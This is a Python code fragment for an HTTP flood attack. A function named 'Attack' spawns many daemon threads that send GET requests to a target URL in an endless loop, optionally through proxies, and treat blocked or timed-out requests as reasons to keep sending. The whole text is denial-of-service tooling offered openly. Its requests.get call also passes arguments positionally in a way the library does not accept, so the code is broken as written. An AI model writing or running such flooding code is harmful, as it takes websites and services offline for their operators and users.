def Attack(url, timeout, data, headers, proxies, thread_value):
    def Sender():
        while True:
            try:
                Spammer = requests.get(url, timeout, data, headers, proxies)
                if Spammer.status_code == 200:
                    print("[Console] Status: Request Sent")
            except requests.ReadTimeout:
                print("[Console][Warning] Status: Request Blocked")
                continue
            except (requests.ConnectTimeout, requests.ConnectionError):
                print("[Console][Critical] Status: Sent Failed || Possible Cause: No Internet")
                continue
            except requests.RequestException:
                print("[Error] Invalid Url!!! Stopping Process...")
                exit()
    def Threader():
        threads = []
        for i in range(thread_value):
            t = threading.Thread(target=Sender)
            t.daemon = True
            threads.append(t)
        for i in range(thread_value):
            threads[i].start()
        for i in range(thread_value):
            threads[i].join()
    Threader()
